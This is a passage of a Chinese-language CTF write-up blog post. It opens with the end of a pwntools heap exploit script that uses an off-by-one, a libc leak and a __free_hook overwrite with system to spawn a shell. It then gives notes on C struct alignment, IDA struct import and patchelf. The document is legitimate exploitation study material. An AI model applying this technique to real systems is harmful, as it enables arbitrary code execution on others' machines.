style="color:#998418"> bytes</span><span style="color:#999999"> =</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Author: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        author</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#999999"> =</span><span style="color:#393A34"> io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">    return</span><span style="color:#393A34"> idx</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#999999">,</span><span style="color:#393A34"> description</span><span style="color:#999999">,</span><span style="color:#393A34"> author</span><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> change_name</span><span style="color:#2993a3">(</span><span style="color:#393A34">author</span><span style="color:#999999">:</span><span style="color:#998418"> bytes</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">    option</span><span style="color:#2993a3">(</span><span style="color:#2F798A">5</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter author name: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">    io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">author</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">Enter author name: </span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 31</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">create_book</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">d0</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">aaa</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">bbb</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create_book</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">ccc</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">ddd</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">create_book</span><span style="color:#2993a3">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">20</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">delete_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#999999">,</span><span style="color:#393A34"> description</span><span style="color:#999999">,</span><span style="color:#393A34"> author </span><span style="color:#999999">=</span><span style="color:#393A34"> print_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">book1_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">author</span><span style="color:#1e754f">[</span><span style="color:#2F798A">32</span><span style="color:#999999">:</span><span style="color:#1e754f">]</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"book1_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">book1_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">edit_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> book1_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#999999">,</span><span style="color:#393A34"> book1_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">30</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">90</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">130</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">ffff</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">change_name</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 32</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">idx</span><span style="color:#999999">,</span><span style="color:#393A34"> name</span><span style="color:#999999">,</span><span style="color:#393A34"> description</span><span style="color:#999999">,</span><span style="color:#393A34"> author </span><span style="color:#999999">=</span><span style="color:#393A34"> print_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">fd_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> u64</span><span style="color:#2993a3">(</span><span style="color:#393A34">name</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#2F798A">8</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">libc_base </span><span style="color:#999999">=</span><span style="color:#393A34"> fd_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">10</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 88</span><span style="color:#AB5959"> -</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">__malloc_hook</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">free_hook_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">__free_hook</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">system_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_base </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">symbols</span><span style="color:#2993a3">[</span><span style="color:#B5695977">"</span><span style="color:#B56959">system</span><span style="color:#B5695977">"</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"fd_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">fd_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">libc_base ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_base</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">free_hook_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">free_hook_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"system_addr ===> </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">system_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#A65E2B">\n</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">edit_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">free_hook_addr</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x20</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><span style="color:#A0ADA0"> # 注意要避免把 book3 size 置 0，否则下一步无法修改 book3 description.</span><br><span style="color:#393A34">edit_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#999999">,</span><span style="color:#393A34"> p64</span><span style="color:#1e754f">(</span><span style="color:#393A34">system_addr</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># input()</span><br><span style="color:#393A34">delete_book</span><span style="color:#2993a3">(</span><span style="color:#2F798A">3</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>反思</a></h2>
<p>讲几个做这道题时遇到的知识点。</p>
<h3 id="q_1:-c-struct" class="scroll-target"><a href="#q_1:-c-struct"><code class="hash inline-code">#</code><code class="language-math math-inline">Q_{1}</code>: C 语言中如何计算 struct 结构的内存大小？</a></h3>
<p><code class="language-math math-inline">A_{1}</code>: 一开始是看 wiki 的时候，不太理解那个 book struct 的内存大小为啥是 0x20 bytes，越想越不对劲，去搜了一下发现还是字节对齐的锅。</p>
<p>字节对齐是为了提高内存访问的效率与速度，它的细节和编译器实现有关，但一般而言，遵循以下规则：</p>
<ol>
<li>结构体变量的首地址是结构体中最宽基本类型成员的大小的倍数；</li>
<li>结构体每个成员相对于结构体首地址的偏移量都是该成员内存大小的整数倍，也就是说相邻的两个不同类型的成员之间可能需要填充字节，填充至相邻两成员的最小公倍数；</li>
<li>结构体所占的总内存大小应为结构体中最宽基本类型成员的倍数，也就是可能在最后一个成员之后填充字节。</li>
</ol>
<p>注意：结构体不算作基本类型成员。</p>
<p>按照这个规则，可以得出以下结构体所占的内存为 24 字节：</p>
<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-c language-c"><span style="color:#AB5959">struct</span><span style="color:#393A34"> node </span><span style="color:#2993a3">{</span><br><span style="color:#AB5959">    char</span><span style="color:#393A34"> a</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // 1 字节，但会填充至 4 字节</span><br><span style="color:#AB5959">    int</span><span style="color:#393A34"> b</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // 4 字节，至此共 8 字节，与 long long 相同，不需要填充</span><br><span style="color:#AB5959">    long</span><span style="color:#AB5959"> long</span><span style="color:#393A34"> c</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // 8 字节，至此共 16 字节</span><br><span style="color:#AB5959">    char</span><span style="color:#393A34"> d</span><span style="color:#999999">;</span><span style="color:#A0ADA0"> // 1 字节，至此共 17 字节</span><br><span style="color:#A0ADA0">    // 结构体总大小必须为 8 的整数倍，所以填充至 24 字节</span><br><span style="color:#2993a3">}</span><span style="color:#999999">;</span><br></code></pre></div>
<h3 id="q_2:-ida" class="scroll-target"><a href="#q_2:-ida"><code class="hash inline-code">#</code><code class="language-math math-inline">Q_{2}</code>: 逆向中如何用 IDA 分析复杂结构体？</a></h3>
<p><code class="language-math math-inline">A_2</code>：算是一个可以加速逆向分析的小 trick，毕竟一堆指针偏移看起来还是挺烦躁的。</p>
<ul>
<li>首先打开 IDA，使用快捷键 Shift+F1 打开本地类型窗口。</li>
<li>按下 insert 快捷键，弹出类型声明窗口，在该窗口的编辑区域以 C 语言语法定义结构体。</li>
<li>输入定义的结构体。</li>
<li>双击我们想要导入的结构体，选择导入结构体。</li>
<li>点击 OK 后 IDA 会自动解析我们定义的结构体。</li>
</ul>
<p>具体细节参考<a href="https://bbs.kanxue.com/thread-266419.htm#msg_header_h1_2" title="https://bbs.kanxue.com/thread-266419.htm#msg_header_h1_2" target="_blank" rel="noopener">这篇文章</a>和<a href="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html" title="https://thinkycx.me/2019-07-15-how-to-create-structs-in-IDA.html" target="_blank" rel="noopener">这篇文章</a>。</p>
<p>关于 ida 中 db, dw, dd, dq 分别是什么含义，可以看<a href="https://www.tortall.net/projects/yasm/manual/html/nasm-pseudop.html" title="https://www.tortall.net/projects/yasm/manual/html/nasm-pseudop.html" target="_blank" rel="noopener">这个</a></p>
<h3 id="q_3:-patchelf" class="scroll-target"><a href="#q_3:-patchelf"><code class="hash inline-code">#</code><code class="language-math math-inline">Q_3</code>: 如何正确使用 patchelf?</a></h3>
<p><code class="language-math math-inline">A_3</code>：先叠个甲，真不是我不读 readme，我前前后后把 patchelf repo readme 读了三四遍，这 b 文档连个示例都没有，我也不知道该用绝对路径还是相对路径，相对路径的话该不该加 ./ 这种东西，绝对路径的话是从家目录开始还是从根目录开始，太抽象了。。。</p>
<p>然后顶着 csdn 的恶臭味找了篇<a href="https://blog.csdn.net/llovewuzhengzi/article/details/134234465" title="https://blog.csdn.net/llovewuzhengzi/article/details/134234465" target="_blank" rel="noopener">教程</a>，你别说。</p>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>总结</a></h2>
<p>这道题目综合考察的知识点还是比较多的，涉及到 off by one 在堆中的利用，绕过 &quot;\x00&quot; 截断，利用 mmap 泄漏 libc，unsort bin attack 和 free hook，还有一些其他乱七八糟的东西。记录这道题目的目的也是为了完全搞懂这些知识点，全部弄清楚。</p>
<p>寒假开始正式接触堆了，数据结构会更复杂，奇奇怪怪的本地通远程不通等等玄学问题，调也调不明白，就顶着压力嗯调，遇到一些小 trick 记录于此，方便日后复习。</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>